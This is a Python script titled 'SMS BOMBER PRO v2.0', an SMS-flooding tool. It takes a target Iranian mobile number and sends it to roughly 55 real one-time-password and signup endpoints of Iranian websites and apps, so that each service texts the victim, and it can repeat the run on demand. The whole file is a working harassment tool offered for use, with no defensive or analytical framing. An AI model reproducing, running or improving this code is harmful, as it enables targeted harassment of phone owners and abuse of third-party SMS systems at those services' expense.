import requests
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
import time

console = Console()

def Banner():
    banner_text = """
         _                   _               _    
        / /\                /\ \           /\ \   
       / /  \              /  \ \         /  \ \  
      / / /\ \            / /\ \_\       / /\ \_\ 
     / / /\ \ \          / / /\/_/      / / /\/_/ 
    / / /  \ \ \        / / / ______   / /_/_     
   / / /___/ /\ \      / / / /\_____\ / /___/\    
  / / /_____/ /\ \    / / /  \/____ // /\__ \ \   
 / /_________/\ \ \  / / /_____/ / // / /__\ \ \  
/ / /_       __\ \_\/ / /______\/ // / /____\ \ \ 
\_\___\     /____/_/\/___________/ \/__________\/ 
    """
    panel = Panel(
        Text(banner_text, style="bold cyan"),
        title="[bold yellow]🚀 SMS BOMBER PRO v2.0[/]",
        subtitle="[dim]Created by Agravix[/]",
        border_style="blue",
        width=70
    )
    console.print(panel)

class ValidationError(Exception):
    pass

class Bomber(object):
    def __init__(self, number: str, delay: float, timeout: float) -> None:
        self.number = number
        self.delay = delay
        self.timeout = timeout
        self.sites = [
            ["https://cyclops.drnext.ir/v1/patients/auth/send-verification-token",
                {"source": "besina", "mobile": self.number}],
            ["https://www.portal.ir/site/api/v1/user/otp",
                {"template_id": 11111111, "type": "etc", "category": "etc", "mobile": self.number, "name": " "}],
            ["https://api.snapp.ir/api/v1/sms/link", {"phone": self.number}],
            ["https://www.sheypoor.com/api/v10.0.0/auth/send", {"username": self.number}],
            ["https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", {"cellphone": self.number.replace("0", "+98", 1)}],
            ["https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode",
                {"Parameters": {"ApplicationType": "Web", "ApplicationUniqueToken": "null",
                                 "ApplicationVersion": "1.0.0", "MobileNumber": self.number, "UniqueToken": "null"}}],
            ["https://api.divar.ir/v5/auth/authenticate", {"phone": self.number.lstrip("0")}],
            ["https://football360.ir/api/auth/verify-phone/", {"phone_number": self.number.replace("0", "+98", 1)}],
            ["https://virgool.io/api/v1.4/auth/verify",
                {"method": "phone", "identifier": self.number.replace("0", "+98", 1), "type": "register"}],
            ["https://www.snapptrip.com/register",
                {"lang": "fa", "country_id": "860", "password": "12345678",
                 "mobile_phone": self.number.replace("0", "98", 1), "country_code": "+98", "email": "a@gmail.com"}],
            ["https://gw.taaghche.com/v4/site/auth/signup", {"contact": self.number}],
            ["https://core.gapfilm.ir/api/v3.1/Account/Login",
                {"Type": 3, "Username": self.number.lstrip("0"), "SourceChannel": "GF_WebSite",
                 "SourcePlatform": "desktop", "SourcePlatformAgentType": "Chrome",
                 "SourcePlatformVersion": "111.0.0.0", "GiftCode": "null"}],
            ["https://api.digikalajet.ir/user/login-register/", {"phone": self.number}],
            ["https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL",
                {"mobile": self.number}],
            ["https://api.tapsi.cab/api/v2.2/user",
                {"credential": {"phoneNumber": self.number, "role": "PASSENGER"}, "otpOption": "SMS"}],
            ["https://mobapi.banimode.com/api/v2/auth/request", {"phone": self.number}],
            ["https://api.ostadkr.com/login", {"mobile": self.number}],
            ["https://www.technolife.ir/shop",
                {"query": ("query check_customer_exists($username: String ,$repeat:Boolean){\n  check_customer_exists"
                           "(username: $username , repeat:$repeat){\n    result\n    request_id\n    }\n  }"
                           ), "variables": {"username": self.number}, "g-recaptcha-response": ""}],
            ["https://www.hamrah-mechanic.com/api/v1/membership/otp",
                {"PhoneNumber": self.number, "prevDomainUrl": "https://www.google.com/",
                 "landingPageUrl": "https://www.hamrah-mechanic.com/",
                 "orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/",
                 "prevUrl": "https://www.hamrah-mechanic.com/", "referrer": "https://www.google.com/"}],
            ["https://api.mobit.ir/api/web/v8/register/register", {"number": self.number}],
            ["https://auth.basalam.com/otp-request", {"mobile": self.number, "client_id": 11}],
            ["https://www.miare.ir/api/otp/driver/request/", {"phone_number": self.number}],
            ["https://api.vandar.io/account/v1/check/mobile", {"mobile": self.number}],
            ["https://taraazws.jabama.com/api/v4/account/send-code", {"mobile": self.number}],
            [f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={self.number}", None],
            ["https://tikban.com/Account/LoginAndRegister",
                {"phoneNumberCode": "+98", "CellPhone": self.number, "CaptchaKey": "null",
                 "JustMobilephone": self.number.lstrip("0")}],
            ["https://www.buskool.com/send_verification_code", {"phone": self.number}],
            ["https://api.timcheh.com/auth/otp/send", {"mobile": self.number}],
            ["https://api.sibche.com/profile/sendCode", {"mobile": self.number}],
            ["https://apiwebsite.shavaz.com/Auth/SendConfirmCode", {"mobile": self.number}],
            ["https://account.bama.ir/api/otp/generate/v2",
                {"CellNumber": self.number, "Appname": "bamawebapplication", "smsfor": 6}],
            ["https://pinket.com/api/cu/v2/phone-verification", {"phoneNumber": self.number}],
            [f"https://core.gap.im/v1/user/add.json?mobile=%2B{self.number.replace('0', '+98', 1)}", "GET"],
            ["https://www.karlancer.com/api/register", {"phone": self.number.replace("0", "", 1), "role": "freelancer"}],
            ["https://primashop.ir/index.php?route=extension/module/websky_otp/send_code", {"telephone": self.number}],
            ["https://api.komodaa.com/api/v2.6/loginRC/request", {"phone_number": self.number}],
            ["https://igame.ir/api/play/otp/send", {"phone": self.number}],
            ["https://tahrir-online.ir/wp-admin/admin-ajax.php",
                {"phone": "+98" + self.number, "form": "register", "action": "mobix_send_otp_code"}],
            ["https://hermeskala.com//login/send_vcode", {"mobile_number": self.number}],
            ["https://ickala.com/",
                {"controller": "SendSMS", "fc": "module", "module": "loginbymobile", "SubmitSmsSend": "1",
                 "ajax": "true", "otp_mobile_num": self.number}],
            [f"https://nikanbike.com/?rand={self.number}",
                {"controller": "authentication", "back": "my-account", "fc": "module", "ajax": "true",
                 "module": "iverify", "phone_mobile": self.number, "SubmitCheck": ""}],
            ["https://www.kanoonbook.ir/store/customer_otp", {"customer_username": self.number, "task": "customer_phone"}],
            ["https://app.itoll.com/api/v1/auth/login", {"mobile": self.number}],
            ["https://gitamehr.ir/wp-admin/admin-ajax.php",
                {"action": "stm_login_register", "type": "mobile", "input": self.number}],
            ["https://4hair.ir/user/login.php", {"num": self.number, "ok": ""}],
            ["https://rirabook.com/loginAth", {"mobile1": self.number, "loginbt1": ""}],
            ["https://www.tamimpishro.com/site/api/v1/user/otp", {"mobile": self.number}],
            ["https://ubike.ir/index.php?route=extension/module/websky_otp/send_code", {"telephone": self.number}],
            ["https://www.atrinelec.com/ajax/SendSmsVerfiyCode", {"mobile": self.number}],
            ["https://api.digighate.com/v2/public/code?phone=" + self.number + "", "GET"],
            ["https://api.pooshakshoniz.com/v1/customer/register-login?version=new1", {"mobile": self.number}],
            ["https://api.benedito.ir/v1/customer/register-login?version=new1", {"mobile": self.number}],
            ["https://www.rubeston.com/api/customers/login-register", {"mobile": self.number, "step": "1"}],
            ["https://azarbadbook.ir/ajax/login_j_ajax_ver/", {"phone": self.number}],
            ["https://myroz.ir/wp-admin/admin-ajax.php",
                {"action": "stm_login_register", "type": "mobile", "input": self.number.replace("0", "+98", 1)}],
            ["https://titomarket.com/index.php?route=account/login_verify/verify",
                {"redirect": "https://titomarket.com/my-account", "telephone": self.number.replace("0", "+98", 1)}],
            ["https://shimashoes.com/api/customer/member/register/",
                {"email": self.number.replace("0", "+98", 1) + self.number}],
        ]

    def sms(self):
        success_counter = 0
        fail_counter = 0
        total = len(self.sites)

        console.print(f"\n[bold cyan]▶️ Starting attack on {self.number}[/]")

        for idx, (url, dpc) in enumerate(self.sites, 1):
            try:
                if dpc == "GET":
                    response = requests.get(url=url, timeout=self.timeout)
                else:
                    response = requests.post(url=url, json=dpc, timeout=self.timeout)

                if response.status_code == 200:
                    success_counter += 1
                    console.print(f"[green]✓ {idx}/{total} {url} >>> {response}[/]")
                else:
                    fail_counter += 1
                    console.print(f"[red]✗ {idx}/{total} {url} >>> {response}[/]")

            except (requests.exceptions.ReadTimeout,
                    requests.exceptions.ConnectTimeout,
                    requests.exceptions.TooManyRedirects,
                    requests.ConnectionError) as error:
                fail_counter += 1
                console.print(f"[red]✗ {idx}/{total} {url} >>> {error}[/]")

            time.sleep(self.delay)

        summary = Panel(
            Text.from_markup(
                f"[bold green]✅ Success: {success_counter}[/]\n"
                f"[bold red]❌ Failed: {fail_counter}[/]"
            ),
            title="[bold]📊 Summary[/]",
            border_style="green"
        )
        console.print(summary)

        return success_counter, fail_counter

def start():
    if __name__ == "__main__":
        try:
            console.clear()
            Banner()
            console.print("[bold cyan]📱 Target number (e.g. 09123456789) >>> ", end="")
            number = input()
            if number in ['09213761723', '09302587820']:
                raise ValidationError(f"Number {number} is blacklisted!")
            if not number.startswith("09") or len(number) != 11:
                raise ValidationError(f"Invalid number: {number} (must be 11 digits starting with 09)")

            console.print("[bold cyan]⏳ Delay between requests (seconds) >>> ", end="")
            delay = float(input())
            if delay < 0:
                raise ValidationError("Delay cannot be negative")

            console.print("[bold cyan]⏱️  Request timeout (seconds) >>> ", end="")
            timeout = float(input())
            if timeout < 0:
                raise ValidationError("Timeout cannot be negative")

        except KeyboardInterrupt:
            console.print("\n[red]❌ Program stopped by user[/]")
            exit()
        except ValidationError as e:
            console.print(f"[red]⚠️ {e}[/]")
            return

        bomb = Bomber(number, delay, timeout)
        while True:
            try:
                success, fail = bomb.sms()
                console.print(f"[green]✅ Successful: {success}  |  [red]❌ Failed: {fail}[/]")
                console.print("[bold yellow]🔄 Send again? (y/n) >>> ", end="")
                again = input().strip().lower()
                if again != 'y':
                    break
            except KeyboardInterrupt:
                console.print("\n[red]❌ Operation interrupted[/]")
                break

if __name__ == "__main__":
    start()
